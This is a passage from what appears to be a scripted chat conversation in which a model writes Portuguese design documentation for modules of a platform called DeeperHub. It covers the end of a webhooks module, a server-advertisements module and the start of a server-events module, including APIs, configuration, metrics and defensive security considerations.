*   **Módulos Internos:** `WebhookService` escuta eventos do `Core.EventBus` e dispara os webhooks correspondentes.
*   **Receptores de Webhook (Clientes):** Devem implementar um endpoint HTTP para receber os POSTs, validar a assinatura (se um segredo foi configurado) e processar o payload. Devem responder rapidamente com um status 2xx para indicar recebimento (processamento pode ser assíncrono no lado deles).

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD de `WebhookSchema`.
*   Testar a formatação e assinatura de payloads.
*   Testar o fluxo de dispatch e retry com um servidor HTTP mockado como endpoint.
*   Testar o Circuit Breaker para endpoints.
*   Testar a lógica de desativação automática e `HealthCheckWorker`.
*   Localização: `test/deeper_hub/webhooks/`.

### 10.2. Métricas

*   `deeper_hub.webhooks.registered.count` (Gauge)
*   `deeper_hub.webhooks.events.published_to_dispatcher.count` (tags: `event_type`)
*   `deeper_hub.webhooks.delivery.attempts.count` (tags: `webhook_id_masked`, `event_type`, `http_status_code_group` (`2xx`, `4xx`, `5xx`, `timeout`, `circuit_open`))
*   `deeper_hub.webhooks.delivery.latency_ms` (Histograma, tags: `webhook_id_masked`, `event_type`)
*   `deeper_hub.webhooks.retries.scheduled.count`
*   `deeper_hub.webhooks.deactivated_due_to_failure.count` (tags: `webhook_id_masked`)
*   `deeper_hub.webhooks.circuit_breaker.state_changed.count` (tags: `webhook_url_host`, `new_state`)

### 10.3. Logs

*   **Nível INFO:** Webhook registrado/atualizado/excluído. Evento enfileirado para dispatch. Entrega bem-sucedida.
*   **Nível WARNING:** Falha na entrega de webhook (com detalhes do erro e código de status). Retentativa agendada. Webhook desativado automaticamente. Circuit breaker aberto para um endpoint.
*   **Nível ERROR:** Falha persistente na entrega após todas as retentativas. Erro crítico no `Dispatcher` ou `Scheduler`.

### 10.4. Telemetria

*   `[:deeper_hub, :webhooks, :definition, :created | :updated | :deleted]`
*   `[:deeper_hub, :webhooks, :event, :prepared_for_dispatch]`
    *   Metadados: `%{webhook_id: id, event_id: id, event_type: type}`
*   `[:deeper_hub, :webhooks, :dispatch, :attempt, :start | :stop | :exception]`
    *   Metadados: `%{webhook_event_id: id, webhook_url: url, attempt_number: num}`
    *   No `:stop`: `%{http_status: code, result: :success | :failure_retryable | :failure_permanent}`
*   `[:deeper_hub, :webhooks, :health_check, :performed]`
    *   Metadados: `%{webhook_id: id, url: url, result: :healthy | :unhealthy}`

## ❌ 11. Tratamento de Erros

*   **Endpoints do Cliente Falhando:** A principal fonte de problemas. A lógica de retry, circuit breaker e desativação automática são para lidar com isso.
*   **Payload Inválido para o Cliente:** O DeeperHub envia um payload JSON bem formado. Se o cliente não conseguir processá-lo, é um problema do lado do cliente (geralmente resulta em 4xx ou 5xx que o DeeperHub trata).
*   **Segredo Incorreto:** Se o cliente não conseguir validar a assinatura, ele deve tratar o webhook como não autêntico.
*   **Falhas Internas no DeeperHub:** Erros no `Dispatcher`, `Scheduler` devem ser logados criticamente e não devem perder eventos (se um sistema de filas persistente como Oban for usado).

## 🛡️ 12. Considerações de Segurança

*   **Validação de URL:** Impedir o registro de URLs que apontem para redes internas ou locais (SSRF). Verificar se a URL usa HTTPS.
*   **Segredos:** Segredos de webhook devem ser gerados com alta entropia e armazenados criptografados. Fornecer uma maneira para o cliente visualizar o segredo apenas uma vez ou regenerá-lo.
*   **Assinatura de Payload:** Sempre assinar payloads para permitir que o receptor verifique a autenticidade e integridade.
*   **Replay Attacks:** Incluir um timestamp e um ID de evento único no payload e na assinatura pode ajudar o receptor a detectar e rejeitar ataques de replay.
*   **Não Vazar Dados Sensíveis:** O componente `DeeperHub.Webhooks.Event` deve garantir que apenas dados apropriados e não sensíveis sejam incluídos nos payloads.
*   **Proteção do Endpoint de Registro:** A API para registrar webhooks deve ser protegida para evitar que atores maliciosos registrem endpoints para spam ou para exfiltrar dados.

## 🧑‍💻 13. Contribuição

*   Ao adicionar suporte para novos tipos de eventos que podem disparar webhooks, certifique-se de que o `DeeperHub.Webhooks.Event` saiba como formatar o payload para eles.
*   A lógica de retry e backoff deve ser cuidadosamente ajustada para não sobrecarregar endpoints que já estão com problemas.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Permitir que clientes configurem filtros mais granulares nos eventos que desejam receber (ex: apenas para um `server_id` específico).
*   [ ] UI para clientes visualizarem logs de entrega detalhados, incluindo payloads enviados e respostas recebidas (com sanitização).
*   [ ] Suporte para formatos de payload alternativos além de JSON (ex: XML, form-urlencoded).
*   [ ] Permitir que clientes configurem suas próprias políticas de retry (dentro de limites).
*   [ ] Testes de \"ping\" manuais para endpoints de webhook a partir da UI do cliente.
*   [ ] Assinaturas de eventos mais avançadas, talvez usando GraphQL Subscriptions ou WebSockets mantidos pelo DeeperHub se a necessidade for de tempo real bidirecional.

---

*Última atualização: 2025-05-12*

---

Webhooks são uma ferramenta poderosa para integrações!

Com isso, cobrimos os principais módulos Core e uma boa parte da camada de Segurança. Já detalhamos também alguns módulos de \"Serviço/Domínio\" como `Servers`, `Achievements`, `Challenges`, `Rewards`, `ServerReviews`, `ServerTags` e `Support`.

O que gostaria de explorar em seguida? Podemos focar em:
1.  Outros utilitários de `Shared.Utils` (`DateUtils`, `MapUtils`, `ListUtils`, `ValidationUtils`, `SecurityUtils`, `FileUtils` - já fizemos alguns destes).
2.  Módulos de domínio restantes da lista original de \"Serviços\" (ex: `ServerAdvertisements`, `ServerEvents`, `ServerUpdateMessages`, `Lists` - que parecia genérico).
3.  Módulos de infraestrutura/segurança restantes (ex: `AtRestEncryptionService` se quisermos aprofundar além do `Core.EncryptionService`, `ResponseSanitizer`)."""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue mostrando todos os que faltaram até o final"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos continuar percorrendo os módulos, focando agora nos que faltam da lista original e garantindo que cada um seja bem documentado e integrado na nova estrutura proposta.

Começaremos pelos \"Serviços\" restantes que parecem ser subdomínios ou funcionalidades associadas aos Servidores, e depois podemos ir para o `Lists` que parece mais genérico.

Vamos detalhar o `DeeperHub.ServerAdvertisements`.

---

# Módulo: `DeeperHub.ServerAdvertisements` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.ServerAdvertisements`

O módulo `DeeperHub.ServerAdvertisements` é responsável por gerenciar **anúncios de servidores** dentro da plataforma DeeperHub. Ele permite que proprietários de servidores criem e paguem (se aplicável) por anúncios para destacar seus servidores, aumentando sua visibilidade para os jogadores.

Este módulo lida com:
*   A criação e configuração de campanhas de anúncios.
*   A exibição de anúncios em locais designados da plataforma.
*   O rastreamento de desempenho dos anúncios (visualizações, cliques).
*   A gestão do ciclo de vida dos anúncios (agendamento, expiração).

O objetivo é fornecer uma ferramenta para proprietários de servidores promoverem suas comunidades e, potencialmente, gerar receita para a plataforma. 😊

*(Nota: Na documentação original, este era `DeeperHub.Services.ServerAdvertisements`. Será tratado como `DeeperHub.ServerAdvertisements`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Definições de Anúncios (`create_advertisement_campaign/1`, `update_advertisement_campaign/2`):**
    *   Permitir que proprietários de servidores (ou administradores) criem campanhas de anúncios.
    *   Definição inclui: servidor a ser anunciado, título/texto do anúncio, imagem/banner, URL de destino (página do servidor), segmentação (opcional: tipo de jogo, região), orçamento/duração da campanha.
*   **Agendamento e Exibição de Anúncios:**
    *   Agendar o início e o fim da exibição de um anúncio.
    *   Lógica para selecionar quais anúncios exibir em um determinado momento/local (ex: rotação, leilão de lances se for um sistema mais complexo).
    *   Garantir que apenas anúncios ativos e aprovados (se houver moderação) sejam exibidos.
*   **Rastreamento de Performance (`track_advertisement_impression/1`, `track_advertisement_click/1`):**
    *   Registrar o número de vezes que um anúncio foi visualizado (impressões).
    *   Registrar o número de vezes que um anúncio foi clicado.
*   **Relatórios de Performance:**
    *   Fornecer aos anunciantes estatísticas sobre o desempenho de suas campanhas (impressões, cliques, CTR).
*   **Moderação de Anúncios (Opcional):**
    *   Fluxo para aprovação de novos anúncios por administradores para garantir conformidade com as diretrizes da plataforma.
*   **Integração com Pagamentos (Se anúncios forem pagos):**
    *   Integrar com um sistema de pagamento para cobrar pelas campanhas de anúncio.
*   **Listagem de Anúncios:**
    *   `list_active_advertisements/1`: Para a plataforma buscar anúncios a serem exibidos.
    *   `list_advertisements_by_server/2`: Para proprietários verem seus anúncios.
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a criação e o desempenho dos anúncios.
    *   Auditar a criação e modificação de campanhas.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerAdvertisements` (Fachada Pública):**
    *   Ponto de entrada para gerenciamento e consulta de anúncios.
    *   Delega para o `ServerAdvertisementsService`.
2.  **`DeeperHub.ServerAdvertisements.Services.ServerAdvertisementsService` (ou `DefaultServerAdvertisementsService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `AdvertisementSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id`.
        *   `DeeperHub.Accounts`: Para `user_id` do criador.
        *   `DeeperHub.Auth`/`RBAC`: Para permissões de gerenciamento.
        *   `DeeperHub.Core.EventBus`: Para eventos.
        *   `DeeperHub.Core.Cache`: Para cachear anúncios ativos.
        *   (Opcional) `DeeperHub.Payments`: Se as campanhas forem pagas.
3.  **`DeeperHub.ServerAdvertisements.Schemas.AdvertisementSchema` (ex-`Advertisement`):**
    *   Campos: `id`, `server_id`, `user_id` (criador), `title`, `description`, `image_url`, `target_url`, `start_date`, `end_date`, `status` (`:pending_approval`, `:active`, `:inactive`, `:expired`, `:rejected`), `budget` (opcional), `impressions_count`, `clicks_count`.
4.  **`DeeperHub.ServerAdvertisements.AdSelectionLogic` (Módulo Funcional, Nova Sugestão):**
    *   **Responsabilidade:** Se a lógica de qual anúncio exibir for complexa (ex: baseada em lances, segmentação, rotação), este módulo conteria essa lógica. Para casos simples, pode estar no `ServerAdvertisementsService`.
5.  **Workers (Opcional):**
    *   `AdvertisementStatusUpdateWorker`: Para atualizar o status de anúncios (ex: de `:active` para `:expired`) periodicamente.
    *   `AdvertisementStatsAggregationWorker`: Para agregar estatísticas de performance.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/server_advertisements/
├── server_advertisements.ex          # Fachada Pública
│
├── services/
│   └── server_advertisements_service.ex # Serviço principal
│
├── schemas/
│   └── advertisement_schema.ex
│
├── storage.ex                        # (Opcional)
├── ad_selection_logic.ex             # (Opcional, Nova Sugestão)
│
├── workers/                          # Opcional
│   ├── advertisement_status_update_worker.ex
│   └── advertisement_stats_aggregation_worker.ex
│
├── cached_adapter.ex                 # (Opcional, da documentação original)
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Simplicidade vs. Complexidade do Sistema de Anúncios:** Decidir se será um sistema simples de \"destaque\" ou um sistema mais complexo com lances, segmentação e otimização de performance.
*   **Moderação:** Se os anúncios podem conter conteúdo customizado, um fluxo de moderação é essencial.
*   **Rastreamento de Performance:** O rastreamento de impressões e cliques precisa ser eficiente e não intrusivo.

## 🛠️ 4. Casos de Uso Principais

*   **Proprietário de Servidor Cria uma Campanha de Anúncio:**
    *   Na UI, seleciona o servidor, define título, descrição, imagem, orçamento e duração.
    *   API chama `ServerAdvertisements.create_advertisement_campaign(user_id, attrs)`.
    *   Anúncio é salvo com status `:pending_approval` ou `:active` (se não houver moderação).
*   **Plataforma Exibe um Anúncio:**
    *   Uma seção da UI (ex: sidebar, topo da lista de servidores) precisa exibir um anúncio.
    *   Chama `ServerAdvertisements.get_advertisement_to_display(%{placement_id: \"sidebar\", user_context: ...})`.
    *   `AdSelectionLogic` escolhe um anúncio ativo.
    *   `ServerAdvertisements.track_advertisement_impression(selected_ad.id)` é chamado.
*   **Usuário Clica em um Anúncio:**
    *   O link do anúncio redireciona através de um endpoint de rastreamento do DeeperHub.
    *   Esse endpoint chama `ServerAdvertisements.track_advertisement_click(ad_id)` e então redireciona para a `target_url` do anúncio.

## 🌊 5. Fluxos Importantes

### Fluxo de Seleção e Exibição de Anúncio

1.  **Solicitação de UI:** A interface do DeeperHub precisa de um anúncio para um slot específico.
2.  Chama `DeeperHub.ServerAdvertisements.get_advertisement_to_display(criteria)`.
3.  **`ServerAdvertisementsService` (ou `AdSelectionLogic`):**
    *   Busca anúncios ativos que correspondam aos critérios (ex: segmentação, não exibido recentemente para este usuário).
    *   Aplica lógica de rotação ou priorização.
    *   Seleciona um anúncio.
    *   Se nenhum anúncio for selecionado, retorna `nil`.
4.  **`ServerAdvertisementsService`:**
    *   Se um anúncio foi selecionado, chama `track_advertisement_impression(selected_ad.id)` (pode ser assíncrono).
    *   Retorna os dados do anúncio para a UI.
5.  **UI:** Renderiza o anúncio.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.ServerAdvertisements`)

*(Baseado nas responsabilidades e na documentação original para `Advertisement`)*

### 6.1. Gerenciamento de Campanhas (Proprietário/Admin)

*   **`DeeperHub.ServerAdvertisements.create_advertisement_campaign(creator_user_id :: String.t(), attrs :: map()) :: {:ok, Advertisement.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{server_id: String.t(), title: String.t(), description: String.t(), image_url: String.t(), target_url: String.t(), start_date: Date.t(), end_date: Date.t(), budget: Decimal.t() | nil, bid_amount: Decimal.t() | nil}`.
*   **`DeeperHub.ServerAdvertisements.update_advertisement_campaign(advertisement_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Advertisement.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerAdvertisements.delete_advertisement_campaign(advertisement_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
*   **`DeeperHub.ServerAdvertisements.list_my_advertisements(user_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(Advertisement.t()), Pagination.t()}`**
    *   `filters`: `:status`.

### 6.2. Exibição e Rastreamento

*   **`DeeperHub.ServerAdvertisements.get_advertisement_to_display(criteria :: map()) :: {:ok, Advertisement.t() | nil}`**
    *   `criteria`: `%{placement_id: String.t(), user_targeting_info: map() | nil}`.
*   **`DeeperHub.ServerAdvertisements.track_advertisement_impression(advertisement_id :: String.t(), viewer_context :: map()) :: :ok`**
    *   `viewer_context`: `%{user_id: String.t() | nil, ip_address: String.t()}`.
*   **`DeeperHub.ServerAdvertisements.track_advertisement_click(advertisement_id :: String.t(), clicker_context :: map()) :: {:ok, %{target_url: String.t()}}`**

### 6.3. Moderação (Admin)

*   **`DeeperHub.ServerAdvertisements.list_pending_approval_advertisements(opts :: keyword()) :: {:ok, list(Advertisement.t()), Pagination.t()}`**
*   **`DeeperHub.ServerAdvertisements.approve_advertisement(advertisement_id :: String.t(), admin_user_id :: String.t()) :: {:ok, Advertisement.t()}`**
*   **`DeeperHub.ServerAdvertisements.reject_advertisement(advertisement_id :: String.t(), reason :: String.t(), admin_user_id :: String.t()) :: {:ok, Advertisement.t()}`**

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_advertisements, :enabled]`** (Boolean).
*   **`[:server_advertisements, :requires_moderation]`** (Boolean): Se novos anúncios precisam de aprovação.
*   **`[:server_advertisements, :max_active_ads_per_placement]`** (Integer).
*   **`[:server_advertisements, :default_ad_duration_days]`** (Integer).
*   **`[:server_advertisements, :impression_counting_method]`** (Atom): `:simple_counter` ou `:unique_user_per_day`.
*   **`[:server_advertisements, :min_bid_amount]`** (Decimal, se houver sistema de lances).
*   **`[:server_advertisements, :cache, :active_ads_ttl_seconds]`** (Integer).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permissões.
*   `DeeperHub.Notifications`: Para notificar sobre status de anúncios.
*   `DeeperHub.Payments` (Opcional): Se os anúncios forem pagos.
*   `DeeperHub.Audit`.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## 🤝 9. Como Usar / Integração

*   **Frontend/UI da Plataforma:** Em locais designados (sidebar, header, entre listagens), chama `get_advertisement_to_display` para buscar e renderizar um anúncio.
*   **Painel do Proprietário do Servidor:** Interface para criar e gerenciar campanhas de anúncios.
*   **Painel de Administração:** Interface para moderar anúncios e ver estatísticas globais.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD de campanhas de anúncio.
*   Testar a lógica de seleção de anúncios (`AdSelectionLogic`).
*   Testar o rastreamento de impressões e cliques.
*   Testar o fluxo de moderação.
*   Testar o agendamento e expiração de anúncios.
*   Localização: `test/deeper_hub/server_advertisements/`.

### 10.2. Métricas

*   `deeper_hub.server_advertisements.campaigns.created.count`
*   `deeper_hub.server_advertisements.impressions.count` (tags: `advertisement_id`, `placement_id`)
*   `deeper_hub.server_advertisements.clicks.count` (tags: `advertisement_id`, `placement_id`)
*   `deeper_hub.server_advertisements.active_ads.gauge` (tags: `placement_id`)
*   `deeper_hub.server_advertisements.moderation.status_changed.count` (tags: `new_status`)

### 10.3. Logs

*   **Nível INFO:** Nova campanha criada, anúncio exibido, clique registrado. Status de anúncio alterado.
*   **Nível WARNING:** Orçamento da campanha esgotado. Anúncio rejeitado na moderação.
*   **Nível ERROR:** Falha ao processar pagamento da campanha.

### 10.4. Telemetria

*   `[:deeper_hub, :server_advertisements, :campaign, :created | :updated | :status_changed]`
*   `[:deeper_hub, :server_advertisements, :ad, :impression]`
*   `[:deeper_hub, :server_advertisements, :ad, :click]`

## ❌ 11. Tratamento de Erros

*   Falhas no rastreamento de impressões/cliques não devem quebrar a exibição da página principal.
*   Erros na seleção de anúncios devem resultar em um slot de anúncio vazio ou um anúncio padrão, não um erro na página.

## 🛡️ 12. Considerações de Segurança

*   **Conteúdo do Anúncio:** Se os anúncios permitem HTML customizado ou scripts, eles são um vetor de XSS significativo. Idealmente, os anúncios são baseados em templates predefinidos com campos de texto/imagem limitados, e todo o conteúdo é rigorosamente sanitizado.
*   **URLs de Destino:** Validar e, possivelmente, verificar `target_url`s para evitar redirecionamentos para sites maliciosos.
*   **Fraude de Cliques/Impressões:** Se o sistema de anúncios envolver pagamento por clique/impressão, mecanismos para detectar e prevenir fraude são necessários (integrando com `FraudDetection`).

## 🧑‍💻 13. Contribuição

*   Novos placements de anúncios devem ser coordenados com a equipe de UI/UX.
*   A lógica de `AdSelectionLogic` pode se tornar complexa e deve ser bem testada.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de lances (bidding) para a exibição de anúncios.
*   [ ] Adicionar segmentação de audiência mais avançada (geográfica, por interesse, por comportamento do usuário).
*   [ ] Testes A/B para diferentes criativos de anúncio.
*   [ ] Limitar a frequência com que um mesmo usuário vê o mesmo anúncio (frequency capping).
*   [ ] Integração com redes de anúncios externas para preencher inventário não vendido (ad network mediation).

---

*Última atualização: 2025-05-12*

---

Este módulo de anúncios pode variar muito em complexidade dependendo dos requisitos!

Próximo? Que tal `DeeperHub.ServerEvents` ou `DeeperHub.ServerUpdateMessages` para continuar com os módulos relacionados a `Servers`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok! Vamos prosseguir com `DeeperHub.ServerEvents`. Este módulo é focado em permitir que os proprietários de servidores criem e gerenciem eventos para suas comunidades.

---

# Módulo: `DeeperHub.ServerEvents` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.ServerEvents`

O módulo `DeeperHub.ServerEvents` gerencia **eventos agendados e em andamento associados a servidores específicos** na plataforma DeeperHub. Ele permite que proprietários de servidores criem e anunciem eventos para suas comunidades, como torneios, manutenções programadas, eventos de XP em dobro, lançamentos de conteúdo, etc.

Este módulo lida com:
*   A definição, criação e gerenciamento de eventos de servidor.
*   O agendamento (data/hora de início e fim) dos eventos.
*   A listagem de eventos ativos, futuros e passados para um servidor ou globalmente.
*   Notificação aos jogadores interessados sobre eventos futuros ou em andamento.

O objetivo é fornecer uma ferramenta para que os servidores engajem suas comunidades e informem os jogadores sobre atividades importantes. 😊

*(Nota: Na documentação original, este era `DeeperHub.Services.ServerEvents`. Será tratado como `DeeperHub.ServerEvents`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Eventos (`create_event/1`, `get_event/1`, `update_event/2`, `delete_event/1`):**
    *   Permitir que proprietários de servidores (ou administradores) criem novos eventos associados a seus servidores.
    *   Cada evento inclui: título, descrição, tipo de evento (ex: `:maintenance`, `:tournament`, `:special_offer`, `:content_update`), data/hora de início, data/hora de fim, imagem/banner opcional, URL para mais informações (opcional).
    *   Atualizar ou excluir eventos agendados.
*   **Listagem de Eventos:**
    *   Listar todos os eventos para um servidor específico (`list_events_by_server/2`).
    *   Listar eventos ativos no momento (`list_current_events/2`).
    *   Listar eventos futuros/próximos (`list_upcoming_events/1`).
    *   Listar eventos passados.
    *   Suportar filtros (por tipo, por servidor) e paginação.
*   **Status do Evento:**
    *   Determinar automaticamente o status de um evento (ex: `:scheduled`, `:active`, `:completed`, `:cancelled`) com base nas datas/horas.
*   **Notificações (Integração com `DeeperHub.Notifications` e `DeeperHub.UserInteractions` se houver \"seguir servidor\"):**
    *   Notificar usuários que seguem um servidor (ou que optaram por receber notificações de eventos) sobre:
        *   Novos eventos agendados.
        *   Eventos que estão prestes a começar.
        *   Início de eventos.
        *   Alterações ou cancelamentos de eventos.
*   **Calendário de Eventos (Visualização):**
    *   Fornecer dados para a construção de uma visualização de calendário de eventos (global ou por servidor).
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a criação e o ciclo de vida dos eventos.
    *   Publicar eventos de domínio (ex: `server_event.created`, `server_event.started`) no `Core.EventBus`.
    *   Auditar a criação/modificação de eventos.
*   **Caching:**
    *   Cachear listas de eventos ativos ou futuros para performance.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerEvents` (Fachada Pública):**
    *   Ponto de entrada para operações de eventos de servidor.
    *   Delega para o `ServerEventsService`.
2.  **`DeeperHub.ServerEvents.Services.ServerEventsService` (ou `DefaultServerEventsService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio para eventos de servidor.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `EventSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id` e associar eventos.
        *   `DeeperHub.Accounts`: Para `user_id` do criador do evento (proprietário do servidor).
        *   `DeeperHub.Auth`/`RBAC`: Para permissões de gerenciamento de eventos.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos de ciclo de vida de `ServerEvent`.
        *   `DeeperHub.Core.Cache`: Para cachear listas de eventos.
        *   `DeeperHub.Notifications`: Para enviar notificações sobre eventos.
        *   `DeeperHub.Core.ConfigManager`.
3.  **`DeeperHub.ServerEvents.Schemas.EventSchema` (ex-`Event`):**
    *   Campos: `id`, `server_id`, `created_by_user_id`, `title`, `description`, `event_type` (atom), `start_time` (NaiveDateTime ou DateTime UTC), `end_time` (NaiveDateTime ou DateTime UTC), `image_url` (opcional), `details_url` (opcional), `status` (calculado ou armazenado, ex: `:scheduled`, `:active`, `:completed`), `is_public`, `inserted_at`, `updated_at`.
4.  **`DeeperHub.ServerEvents.Storage` (ou lógica no `ServerEventsService`):**
    *   Encapsula as queries Ecto.
5.  **Workers (Opcional):**
    *   `EventStatusUpdateWorker`: Para atualizar periodicamente o status de eventos (ex: de `:scheduled` para `:active`, de `:active` para `:completed`).
    *   `EventNotificationWorker`: Para enviar notificações agendadas sobre eventos (ex: lembretes).

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/server_events/
├── server_events.ex                  # Fachada Pública
│
├── services/
│   └── server_events_service.ex      # Serviço principal
│
├── schemas/
│   └── event_schema.ex
│
├── storage.ex                        # (Opcional)
│
├── workers/                          # Opcional
│   ├── event_status_update_worker.ex
│   └── event_notification_worker.ex
│
├── cached_adapter.ex                 # (Opcional, da documentação original)
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Datas e Fusos Horários:** Usar `DateTime` com UTC para `start_time` e `end_time` é crucial se os eventos são globais ou se os usuários estão em diferentes fusos horários. Se os eventos são sempre no \"horário do servidor\" e o fuso do servidor é conhecido, `NaiveDateTime` pode ser usado, mas a conversão para exibição ao usuário ainda é necessária.
*   **Status do Evento:** Pode ser um campo persistido atualizado por um worker ou calculado dinamicamente nas queries e na lógica de serviço com base nas datas/horas atuais. Cálculo dinâmico é mais simples, mas menos eficiente para queries de status.
*   **Notificações:** A lógica de quem é notificado (ex: seguidores do servidor, todos os jogadores, etc.) e quando (X horas antes, no início) precisa ser bem definida.

## 🛠️ 4. Casos de Uso Principais

*   **Proprietário de Servidor Agenda uma Manutenção:**
    *   Na UI, define título \"Manutenção Semanal\", descrição, tipo `:maintenance`, `start_time` e `end_time`.
    *   API chama `ServerEvents.create_event(user_id, server_id, event_attrs)`.
    *   O evento é salvo com status `:scheduled`.
    *   Usuários que seguem o servidor são notificados (ex: \"Manutenção agendada para [data]\").
*   **Jogador Verifica Eventos Ativos em um Servidor:**
    *   Na página do servidor, UI chama API que leva a `ServerEvents.list_current_events(server_id)`.
*   **Sistema Inicia um Evento Agendado:**
    *   `EventStatusUpdateWorker` roda.
    *   Encontra eventos cujo `start_time` passou e o status ainda é `:scheduled`.
    *   Atualiza o status para `:active`.
    *   Publica evento `server_event.started` no `Core.EventBus`.
    *   (Opcional) Envia notificações \"Evento X começou!\".

## 🌊 5. Fluxos Importantes

### Fluxo de Criação e Notificação de Novo Evento

1.  **Proprietário (UI):** Submete formulário de novo evento.
2.  **Controller API:** Valida autenticação e autorização (se o usuário é proprietário do servidor). Chama `DeeperHub.ServerEvents.create_event(current_user.id, server_id, params[\"event\"])`.
3.  **`ServerEventsService.create_event/3`:**
    *   Valida os `attrs` (datas, tipo, etc.).
    *   Cria um `EventSchema` changeset.
    *   Se válido, `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Publica evento `server_event.created` no `Core.EventBus` (`%{event_id: new_event.id, server_id: ..., details: ...}`).
        *   (Assíncrono) Enfileira uma tarefa para `EventNotificationWorker` ou chama diretamente `DeeperHub.Notifications` para notificar usuários relevantes (ex: seguidores do `server_id`) sobre o novo evento agendado.
        *   Retorna `{:ok, event_struct}`.
    *   Se falha, retorna erro.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.ServerEvents`)

### 6.1. Gerenciamento de Eventos (Proprietário/Admin)

*   **`DeeperHub.ServerEvents.create_event(creator_user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, Event.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{title: String.t(), description: String.t(), event_type: atom(), start_time: DateTime.t(), end_time: DateTime.t(), image_url: String.t() | nil}`.
*   **`DeeperHub.ServerEvents.update_event(event_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Event.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerEvents.delete_event(event_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
*   **`DeeperHub.ServerEvents.cancel_event(event_id :: String.t(), reason :: String.t() | nil, current_user_id :: String.t()) :: {:ok, Event.t()} | {:error, term()}` (Nova Sugestão)**
    *   Muda o status para `:cancelled` e notifica.

### 6.2. Consulta de Eventos

*   **`DeeperHub.ServerEvents.get_event(event_id :: String.t()) :: {:ok, Event.t() | nil}`**
*   **`DeeperHub.ServerEvents.list_events_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Event.t()), Pagination.t()}`**
    *   `opts`: `:status` (`:scheduled`, `:active`, `:completed`, `:cancelled`), `:type`, `:date_range` (`%{start_after: DateTime.t(), end_before: DateTime.t()}`), `:page`, `:per_page`, `:sort_by`.
*   **`DeeperHub.ServerEvents.list_active_events(filters :: map() | nil, opts :: keyword()) :: {:ok, list(Event.t()), Pagination.t()}`**
    *   `filters`: `:server_id`, `:type`. Lista eventos que estão atualmente acontecendo.
*   **`DeeperHub.ServerEvents.list_upcoming_events(filters :: map() | nil, opts :: keyword()) :: {:ok, list(Event.t()), Pagination.t()}`**
    *   `filters`: `:server_id`, `:type`. Lista eventos agendados para o futuro.
*   **`DeeperHub.ServerEvents.get_global_event_calendar(date_range :: map(), filters :: map() | nil) :: {:ok, list(CalendarEvent.t())}` (Nova Sugestão)**
    *   `CalendarEvent.t()`: `%{id: ..., title: ..., start: DateTime.t(), end: DateTime.t(), server_name: ..., color_by_type: ...}`. Para alimentar uma UI de calendário.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_events, :enabled]`** (Boolean).
*   **`[:server_events, :max_event_duration_hours]`** (Integer). (Padrão: `7 * 24` - 1 semana)
*   **`[:server_events, :default_event_types]`** (List de Atoms ou Maps com descrições): Tipos de evento pré-definidos.
*   **`[:server_events, :notification, :notify_before_start_minutes]`** (List de Integers): Quando enviar lembretes (ex: `[60, 15]` - 1 hora e 15 mins antes).
*   **`[:server_events, :cache, :active_events_ttl_seconds]`** (Integer).
*   **`[:server_events, :worker, :status_update_interval_minutes]`** (Integer).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permissões.
